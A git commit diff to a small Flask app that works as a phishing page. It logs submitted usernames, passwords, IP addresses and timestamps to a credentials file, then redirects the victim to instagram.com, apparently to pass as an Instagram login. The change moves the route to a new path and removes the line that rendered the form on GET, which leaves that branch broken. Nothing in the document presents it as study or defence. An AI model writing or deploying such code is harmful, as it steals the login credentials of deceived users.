17a43bbb962a429ee5433fb7052b4f646cffd585
c41llu <c41llu@protonmail.com>
2025-05-31 17:31:46 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,10 +1,9 @@
-
 from flask import Flask, request, render_template, redirect, url_for
 from datetime import datetime
 
 app = Flask(__name__)
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/mipagina', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
         username = request.form.get('username')
@@ -15,12 +14,12 @@ def index():
         with open("credentials.txt", "a") as f:
             f.write(f"Usuario: {username} | Contraseña: {password} | IP: {ip} | Fecha: {time}\n")
 
-        return redirect(url_for('gracias'))
-    return render_template("form.html")
+        return redirect("https://www.instagram.com")
+
 
 @app.route('/gracias')
 def gracias():
-    return render_template("Location: https://www.instagram.com")
+    return redirect("https://instagram.com/")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
